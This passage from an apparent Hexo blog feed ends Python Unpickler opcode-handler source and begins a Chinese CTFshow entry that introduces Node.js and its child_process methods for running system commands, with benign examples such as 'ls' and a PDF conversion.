number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_pop_mark    <span class="token keyword">def</span> <span class="token function">load_dup</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>DUP<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_dup    <span class="token keyword">def</span> <span class="token function">load_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Memo value not found at index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>    dispatch<span class="token punctuation">[</span>GET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_get    <span class="token keyword">def</span> <span class="token function">load_binget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> KeyError <span class="token keyword">as</span> exc<span class="token punctuation">:</span>            msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Memo value not found at index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>    dispatch<span class="token punctuation">[</span>BINGET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binget    <span class="token keyword">def</span> <span class="token function">load_long_binget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> KeyError <span class="token keyword">as</span> exc<span class="token punctuation">:</span>            msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Memo value not found at index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>    dispatch<span class="token punctuation">[</span>LONG_BINGET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_long_binget    <span class="token keyword">def</span> <span class="token function">load_put</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"negative PUT argument"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>PUT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_put    <span class="token keyword">def</span> <span class="token function">load_binput</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"negative BINPUT argument"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>BINPUT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binput    <span class="token keyword">def</span> <span class="token function">load_long_binput</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        i<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">></span> maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"negative LONG_BINPUT argument"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>memo<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>LONG_BINPUT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_long_binput    <span class="token keyword">def</span> <span class="token function">load_memoize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        memo <span class="token operator">=</span> self<span class="token punctuation">.</span>memo        memo<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>MEMOIZE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_memoize    <span class="token keyword">def</span> <span class="token function">load_append</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        value <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">list</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>APPEND<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_append    <span class="token keyword">def</span> <span class="token function">load_appends</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        list_obj <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            extend <span class="token operator">=</span> list_obj<span class="token punctuation">.</span>extend        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            extend<span class="token punctuation">(</span>items<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># Even if the PEP 307 requires extend() and append() methods,</span>        <span class="token comment"># fall back on append() if the object has no extend() method</span>        <span class="token comment"># for backward compatibility.</span>        append <span class="token operator">=</span> list_obj<span class="token punctuation">.</span>append        <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>            append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>APPENDS<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_appends    <span class="token keyword">def</span> <span class="token function">load_setitem</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        value <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">dict</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token builtin">dict</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value    dispatch<span class="token punctuation">[</span>SETITEM<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_setitem    <span class="token keyword">def</span> <span class="token function">load_setitems</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">dict</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">dict</span><span class="token punctuation">[</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> items<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>    dispatch<span class="token punctuation">[</span>SETITEMS<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_setitems    <span class="token keyword">def</span> <span class="token function">load_additems</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>pop_mark<span class="token punctuation">(</span><span class="token punctuation">)</span>        set_obj <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>set_obj<span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            set_obj<span class="token punctuation">.</span>update<span class="token punctuation">(</span>items<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            add <span class="token operator">=</span> set_obj<span class="token punctuation">.</span>add            <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>                add<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>ADDITEMS<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_additems    <span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        setstate <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> setstate <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>            <span class="token keyword">return</span>        slotstate <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>            state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state        <span class="token keyword">if</span> state<span class="token punctuation">:</span>            inst_dict <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__            <span class="token builtin">intern</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span><span class="token builtin">intern</span>            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    inst_dict<span class="token punctuation">[</span><span class="token builtin">intern</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v                <span class="token keyword">else</span><span class="token punctuation">:</span>                    inst_dict<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token builtin">setattr</span><span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BUILD<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_build    <span class="token keyword">def</span> <span class="token function">load_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append    dispatch<span class="token punctuation">[</span>MARK<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_mark    <span class="token keyword">def</span> <span class="token function">load_stop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">raise</span> _Stop<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>STOP<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowNodejs</title>
      <link href="/posts/56040919.html"/>
      <url>/posts/56040919.html</url>
      
        <content type="html"><![CDATA[        <h1 id="nodejs"   >          <a href="#nodejs" class="heading-link"><i class="fas fa-link"></i></a><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1>      <p>首先要知道nodejs是啥，其实就是javascript的后端版本</p><p>一些有的没的的入门知识</p><p><span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/7752#toc-5" >nodejs一些入门特性&amp;&amp;实战</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>nodejs调用系统命令的方式</strong></p><p>如果你要是使用nodejs，你需要调用引用<code>child_process</code>模块：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> exec <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exec<span class="token punctuation">;</span><span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token string">'prince -v builds/pdf/book.html -o builds/pdf/book.pdf'</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 获取命令执行的输出</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用的是<code>child_process.exec</code>来在nodejs程序里执行系统命令。如果你想在shell里执行命令并且要处理命令输出的I/O数据流，输出的体积比较大的话，我们需要使用<code>child_process.spawn</code>：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>spawn<span class="token punctuation">;</span><span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'prince'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>  <span class="token string">'-v'</span><span class="token punctuation">,</span> <span class="token string">'builds/pdf/book.html'</span><span class="token punctuation">,</span>  <span class="token string">'-o'</span><span class="token punctuation">,</span> <span class="token string">'builds/pdf/book.pdf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>child<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// output will be here in chunks</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// or if you want to send output elsewhere</span>child<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你想在nodejs里执行的是一个文件，而不是一个简单的命令，那你就需要使用<code>child_process.execFile</code>，这个方法的参数几乎和<code>spawn</code>一样，只是多了第四个回调函数参数，和<code>exec</code>里的回调函数参数一样：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> execFile <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execFile<span class="token punctuation">;</span><span class="token function">execFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> args<span class="token punctuation">,</span> options<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// command output is in stdout</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的这些方法在nodejs里都是异步执行的，到但有时候我们需要同步执行一些任务，下面的一些代码例子是使用同步的方法调用系统命令执行任务：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">const</span>    spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span> <span class="token string">'child_process'</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>spawnSync<span class="token punctuation">,</span>    ls <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span> <span class="token string">'ls'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token string">'-lh'</span><span class="token punctuation">,</span> <span class="token string">'/usr'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stderr: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ls<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">stdout: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ls<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> execSync <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>execSync<span class="token punctuation">;</span><span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'prince -v builds/pdf/book.html -o builds/pdf/book.pdf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 